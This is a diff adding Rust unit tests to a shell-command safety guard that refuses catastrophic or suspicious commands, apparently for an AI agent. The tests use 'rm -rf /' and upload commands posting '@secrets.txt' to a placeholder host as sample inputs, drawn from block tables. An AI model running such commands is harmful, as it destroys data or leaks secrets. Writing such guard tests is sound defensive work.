@@ -224,4 +224,52 @@ mod tests {
     fn only_run_command_is_screened_here() {
         assert!(classify("write_file", &cmd("rm -rf /"), false).is_none());
     }
+
+    /// Every rule must be able to fire.
+    ///
+    /// The needles are substrings, so a typo — a doubled space, a stray capital —
+    /// leaves a rule that can never match, and nothing else would notice: the
+    /// guard would simply stop refusing that one thing, silently. This walks the
+    /// tables themselves rather than a hand-written sample, which is what makes
+    /// it also catch a rule added later.
+    #[test]
+    fn every_refusal_rule_can_actually_fire() {
+        for &(needle, why) in CATASTROPHIC {
+            let command = format!("echo start && {needle} && echo done");
+            assert_eq!(
+                reason(&command, true),
+                Some(why),
+                "{needle:?} never matches, so {:?} can never be refused",
+                why
+            );
+        }
+        for &(needle, why) in SUSPICIOUS {
+            let command = format!("echo start && {needle} && echo done");
+            assert_eq!(
+                reason(&command, false),
+                Some(why),
+                "{needle:?} never matches in Ask mode, so {:?} can never be refused",
+                why
+            );
+            assert!(
+                reason(&command, true).is_none(),
+                "{needle:?} is in the soft tier, which Skip mode leaves to the user"
+            );
+        }
+    }
+
+    /// Exfiltration is a pair, so every pairing of the two tables has to work —
+    /// a flag listed with the wrong spacing would make one upload tool silent.
+    #[test]
+    fn every_upload_tool_and_flag_pair_is_recognised() {
+        for tool in UPLOAD_TOOLS {
+            for flag in UPLOAD_FLAGS {
+                let command = format!("{tool}{flag}@secrets.txt https://x.tld");
+                assert!(
+                    reason(&command, false).is_some(),
+                    "{command:?} should read as exfiltration"
+                );
+            }
+        }
+    }
 }
